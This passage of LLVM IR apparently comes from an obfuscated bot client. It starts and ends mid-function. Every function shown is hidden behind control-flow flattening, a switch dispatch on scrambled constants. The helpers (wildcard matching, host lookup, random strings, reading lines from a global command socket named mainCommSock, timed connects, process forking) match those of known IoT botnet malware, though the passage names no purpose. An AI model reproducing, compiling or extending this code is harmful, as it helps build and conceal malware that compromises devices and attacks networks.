switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload11 = load volatile i32, i32* %.reg2mem
  %Pivot6 = icmp slt i32 %.reload11, 42
  %9 = select i1 %Pivot6, i32 424650567, i32 -379413528
  store i32 %9, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload9 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload9, 63
  %10 = select i1 %Pivot, i32 -629636976, i32 -228437050
  store i32 %10, i32* %switchVar
  br label %loopEnd

LeafBlock3:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf4 = icmp eq i32 %.reload, 63
  %11 = select i1 %SwitchLeaf4, i32 1446442480, i32 -905771844
  store i32 %11, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload8 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload8, 42
  %12 = select i1 %SwitchLeaf2, i32 -2004292568, i32 -905771844
  store i32 %12, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload10 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf = icmp eq i32 %.reload10, 0
  %13 = select i1 %SwitchLeaf, i32 -592541091, i32 -905771844
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  store i32 %17, i32* %3, align 4
  store i32 354204907, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = getelementptr inbounds i8, i8* %19, i64 1
  %21 = load i8*, i8** %5, align 8
  %22 = call i32 @wildString(i8* %20, i8* %21)
  %23 = icmp ne i32 %22, 0
  %24 = select i1 %23, i32 786365502, i32 -1636131498
  store i32 %24, i32* %switchVar
  store i1 true, i1* %.reg2mem14
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i8*, i8** %5, align 8
  %27 = load i8, i8* %26, align 1
  %28 = zext i8 %27 to i32
  %29 = icmp ne i32 %28, 0
  %30 = select i1 %29, i32 1444194203, i32 1361781638
  store i32 %30, i32* %switchVar
  store i1 false, i1* %.reg2mem12
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i8*, i8** %4, align 8
  %33 = load i8*, i8** %5, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 1
  %35 = call i32 @wildString(i8* %32, i8* %34)
  %36 = icmp ne i32 %35, 0
  %37 = xor i1 %36, true
  store i32 1361781638, i32* %switchVar
  store i1 %37, i1* %.reg2mem12
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload13 = load i1, i1* %.reg2mem12
  store i32 -1636131498, i32* %switchVar
  store i1 %.reload13, i1* %.reg2mem14
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %.reload15 = load i1, i1* %.reg2mem14
  %40 = xor i1 %.reload15, true
  %41 = zext i1 %40 to i32
  store i32 %41, i32* %3, align 4
  store i32 354204907, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %5, align 8
  %44 = load i8, i8* %43, align 1
  %45 = zext i8 %44 to i32
  %46 = icmp ne i32 %45, 0
  %47 = select i1 %46, i32 -372266218, i32 1769290069
  store i32 %47, i32* %switchVar
  store i1 false, i1* %.reg2mem16
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i8*, i8** %4, align 8
  %50 = getelementptr inbounds i8, i8* %49, i64 1
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = call i32 @wildString(i8* %50, i8* %52)
  %54 = icmp ne i32 %53, 0
  %55 = xor i1 %54, true
  store i32 1769290069, i32* %switchVar
  store i1 %55, i1* %.reg2mem16
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %.reload17 = load i1, i1* %.reg2mem16
  %57 = xor i1 %.reload17, true
  %58 = zext i1 %57 to i32
  store i32 %58, i32* %3, align 4
  store i32 354204907, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 600139901, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i8*, i8** %4, align 8
  %61 = load i8, i8* %60, align 1
  %62 = zext i8 %61 to i32
  %63 = call i32 @toupper(i32 %62) #9
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = call i32 @toupper(i32 %66) #9
  %68 = icmp eq i32 %63, %67
  %69 = select i1 %68, i32 -1245009137, i32 1924741566
  store i32 %69, i32* %switchVar
  store i1 false, i1* %.reg2mem18
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i8*, i8** %4, align 8
  %72 = getelementptr inbounds i8, i8* %71, i64 1
  %73 = load i8*, i8** %5, align 8
  %74 = getelementptr inbounds i8, i8* %73, i64 1
  %75 = call i32 @wildString(i8* %72, i8* %74)
  %76 = icmp ne i32 %75, 0
  %77 = xor i1 %76, true
  store i32 1924741566, i32* %switchVar
  store i1 %77, i1* %.reg2mem18
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %.reload19 = load i1, i1* %.reg2mem18
  %79 = xor i1 %.reload19, true
  %80 = zext i1 %79 to i32
  store i32 %80, i32* %3, align 4
  store i32 354204907, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i32, i32* %3, align 4
  ret i32 %82

loopEnd:                                          ; preds = %78, %70, %59, %NewDefault, %56, %48, %42, %39, %38, %31, %25, %18, %14, %LeafBlock, %LeafBlock1, %LeafBlock3, %NodeBlock, %NodeBlock5, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #5
  store i32 %8, i32* %.reg2mem
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 349054954, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 349054954, label %first
    i32 1371971918, label %13
    i32 -1616269195, label %14
    i32 1866379235, label %15
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %11 = icmp eq i32 %.reload, -1
  %12 = select i1 %11, i32 1371971918, i32 -1616269195
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  store i32 1866379235, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 1866379235, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i32, i32* %3, align 4
  ret i32 %16

loopEnd:                                          ; preds = %14, %13, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  %switchVar = alloca i32
  store i32 -1382275104, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1382275104, label %6
    i32 1364713612, label %11
    i32 -160536269, label %20
    i32 -2086942801, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  %10 = select i1 %9, i32 1364713612, i32 -2086942801
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = call i32 @rand_cmwc()
  %13 = urem i32 %12, 26
  %14 = add i32 %13, 65
  %15 = trunc i32 %14 to i8
  %16 = load i8*, i8** %3, align 8
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  store i8 %15, i8* %19, align 1
  store i32 -160536269, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %5, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %5, align 4
  store i32 -1382275104, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %20, %11, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  %switchVar = alloca i32
  store i32 -2081597845, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -2081597845, label %24
    i32 1993121332, label %33
    i32 645948903, label %50
    i32 -2111913663, label %51
    i32 -779477287, label %55
    i32 -38867023, label %58
    i32 1797328585, label %67
    i32 1621685397, label %84
    i32 1218604246, label %87
    i32 -191934107, label %88
    i32 1647399634, label %89
    i32 -879172076, label %91
    i32 1886527153, label %96
    i32 -478454597, label %101
    i32 1191923326, label %103
    i32 -2068233220, label %111
    i32 -1376763521, label %112
    i32 2045003662, label %115
    i32 1144578750, label %118
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #5, !srcloc !2
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  store i32 1993121332, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  %49 = select i1 %48, i32 645948903, i32 1647399634
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  store i32 -2111913663, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = load i32, i32* %13, align 4
  %53 = icmp slt i32 %52, 10
  %54 = select i1 %53, i32 -779477287, i32 -191934107
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %56, align 8
  %57 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %57, align 8
  store i32 -38867023, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %60 = getelementptr inbounds [16 x i64], [16 x i64]* %59, i64 0, i64 0
  %61 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %60) #5, !srcloc !3
  %62 = extractvalue { i64, i64* } %61, 0
  %63 = extractvalue { i64, i64* } %61, 1
  %64 = trunc i64 %62 to i32
  store i32 %64, i32* %14, align 4
  %65 = ptrtoint i64* %63 to i64
  %66 = trunc i64 %65 to i32
  store i32 %66, i32* %15, align 4
  store i32 1797328585, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i32, i32* %5, align 4
  %69 = srem i32 %68, 64
  %70 = zext i32 %69 to i64
  %71 = shl i64 1, %70
  %72 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %73 = load i32, i32* %5, align 4
  %74 = sdiv i32 %73, 64
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds [16 x i64], [16 x i64]* %72, i64 0, i64 %75
  %77 = load i64, i64* %76, align 8
  %78 = or i64 %77, %71
  store i64 %78, i64* %76, align 8
  %79 = load i32, i32* %5, align 4
  %80 = add nsw i32 %79, 1
  %81 = call i32 @select(i32 %80, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %81, i32* %12, align 4
  %82 = icmp sle i32 %81, 0
  %83 = select i1 %82, i32 1621685397, i32 1218604246
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %13, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %13, align 4
  store i32 -2111913663, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  store i32 -191934107, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  store i32 1647399634, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 0, i32* %18, align 4
  %90 = load i8*, i8** %6, align 8
  store i8* %90, i8** %17, align 8
  store i32 -879172076, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %7, align 4
  %93 = add nsw i32 %92, -1
  store i32 %93, i32* %7, align 4
  %94 = icmp sgt i32 %92, 1
  %95 = select i1 %94, i32 1886527153, i32 2045003662
  store i32 %95, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* @mainCommSock, align 4
  %98 = call i64 @recv(i32 %97, i8* %16, i64 1, i32 0)
  %99 = icmp ne i64 %98, 1
  %100 = select i1 %99, i32 -478454597, i32 1191923326
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = load i8*, i8** %17, align 8
  store i8 0, i8* %102, align 1
  store i32 -1, i32* %4, align 4
  store i32 1144578750, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i8, i8* %16, align 1
  %105 = load i8*, i8** %17, align 8
  %106 = getelementptr inbounds i8, i8* %105, i32 1
  store i8* %106, i8** %17, align 8
  store i8 %104, i8* %105, align 1
  %107 = load i8, i8* %16, align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 10
  %110 = select i1 %109, i32 -2068233220, i32 -1376763521
  store i32 %110, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  store i32 2045003662, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = load i32, i32* %18, align 4
  %114 = add nsw i32 %113, 1
  store i32 %114, i32* %18, align 4
  store i32 -879172076, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  %116 = load i8*, i8** %17, align 8
  store i8 0, i8* %116, align 1
  %117 = load i32, i32* %18, align 4
  store i32 %117, i32* %4, align 4
  store i32 1144578750, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i32, i32* %4, align 4
  ret i32 %119

loopEnd:                                          ; preds = %115, %112, %111, %103, %101, %96, %91, %89, %88, %87, %84, %67, %58, %55, %51, %50, %33, %24, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #10
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  store i32 %34, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1594282536, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1594282536, label %first
    i32 -259984987, label %37
    i32 -68130682, label %38
    i32 -1478599203, label %47
    i32 253228485, label %52
    i32 -1451270896, label %57
    i32 1765684144, label %66
    i32 -1415320285, label %83
    i32 -1409845466, label %90
    i32 -2093334923, label %91
    i32 627044172, label %92
    i32 -1268251756, label %93
    i32 771139715, label %94
    i32 1010478610, label %95
    i32 1819573782, label %96
    i32 1461088220, label %105
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %35 = icmp ne i32 %.reload, 0
  %36 = select i1 %35, i32 -259984987, i32 -68130682
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 1461088220, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %40 = getelementptr inbounds [8 x i8], [8 x i8]* %39, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 8, i32 4, i1 false)
  %41 = load i32, i32* %6, align 4
  %42 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %43 = call i32 @connect(i32 %41, %struct.sockaddr* %42, i32 16)
  store i32 %43, i32* %16, align 4
  %44 = load i32, i32* %16, align 4
  %45 = icmp slt i32 %44, 0
  %46 = select i1 %45, i32 -1478599203, i32 1819573782
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = call i32* @__errno_location() #10
  %49 = load i32, i32* %48, align 4
  %50 = icmp eq i32 %49, 115
  %51 = select i1 %50, i32 253228485, i32 771139715
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %54, i64* %55, align 8
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %56, align 8
  store i32 -1451270896, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %59 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 0
  %60 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %59) #5, !srcloc !4
  %61 = extractvalue { i64, i64* } %60, 0
  %62 = extractvalue { i64, i64* } %60, 1
  %63 = trunc i64 %61 to i32
  store i32 %63, i32* %17, align 4
  %64 = ptrtoint i64* %62 to i64
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %18, align 4
  store i32 1765684144, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %6, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %72 = load i32, i32* %6, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = or i64 %76, %70
  store i64 %77, i64* %75, align 8
  %78 = load i32, i32* %6, align 4
  %79 = add nsw i32 %78, 1
  %80 = call i32 @select(i32 %79, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %81 = icmp sgt i32 %80, 0
  %82 = select i1 %81, i32 -1415320285, i32 627044172
  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  store i32 4, i32* %13, align 4
  %84 = load i32, i32* %6, align 4
  %85 = bitcast i32* %14 to i8*
  %86 = call i32 @getsockopt(i32 %84, i32 1, i32 4, i8* %85, i32* %13) #5
  %87 = load i32, i32* %14, align 4
  %88 = icmp ne i32 %87, 0
  %89 = select i1 %88, i32 -1409845466, i32 -2093334923
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 1461088220, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 -1268251756, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 1461088220, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  store i32 1010478610, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 1461088220, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 1819573782, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %6, align 4
  %98 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 3, i8* null)
  %99 = sext i32 %98 to i64
  store i64 %99, i64* %15, align 8
  %100 = load i64, i64* %15, align 8
  %101 = and i64 %100, -2049
  store i64 %101, i64* %15, align 8
  %102 = load i32, i32* %6, align 4
  %103 = load i64, i64* %15, align 8
  %104 = call i32 (i32, i32, ...) @fcntl(i32 %102, i32 4, i64 %103)
  store i32 1, i32* %5, align 4
  store i32 1461088220, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %5, align 4
  ret i32 %106

loopEnd:                                          ; preds = %96, %95, %94, %93, %92, %91, %90, %83, %66, %57, %52, %47, %38, %37, %first, %switchDefault
  br label %loopEntry
}

declare i32 @fcntl(i32, i32, ...) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #6

declare i32 @connect(i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #6

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #5
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  store i32 %6, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1601028103, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1601028103, label %first
    i32 750434152, label %9
    i32 843879671, label %11
    i32 917783193, label %19
    i32 328577346, label %26
    i32 697971115, label %36
    i32 -50096702, label %39
    i32 -1198247426, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %7 = icmp ule i32 %.reload, 0
  %8 = select i1 %7, i32 750434152, i32 843879671
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %2, align 4
  store i32 %10, i32* %1, align 4
  store i32 -1198247426, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i64, i64* @numpids, align 8
  %13 = add i64 %12, 1
  store i64 %13, i64* @numpids, align 8
  %14 = load i64, i64* @numpids, align 8
  %15 = add i64 %14, 1
  %16 = mul i64 %15, 4
  %17 = call noalias i8* @malloc(i64 %16) #5
  %18 = bitcast i8* %17 to i32*
  store i32* %18, i32** %3, align 8
  store i32 0, i32* %4, align 4
  store i32 917783193, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = zext i32 %20 to i64
  %22 = load i64, i64* @numpids, align 8
  %23 = sub i64 %22, 1
  %24 = icmp ult i64 %21, %23
  %25 = select i1 %24, i32 328577346, i32 -50096702
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i32*, i32** @pids, align 8
  %28 = load i32, i32* %4, align 4
  %29 = zext i32 %28 to i64
  %30 = getelementptr inbounds i32, i32* %27, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = load i32*, i32** %3, align 8
  %33 = load i32, i32* %4, align 4
  %34 = zext i32 %33 to i64
  %35 = getelementptr inbounds i32, i32* %32, i64 %34
  store i32 %31, i32* %35, align 4
  store i32 697971115, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %4, align 4
  %38 = add i32 %37, 1
  store i32 %38, i32* %4, align 4
  store i32 917783193, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %2, align 4
  %41 = load i32*, i32** %3, align 8
  %42 = load i64, i64* @numpids, align 8
  %43 = sub i64 %42, 1
  %44 = getelementptr inbounds i32, i32* %41, i64 %43
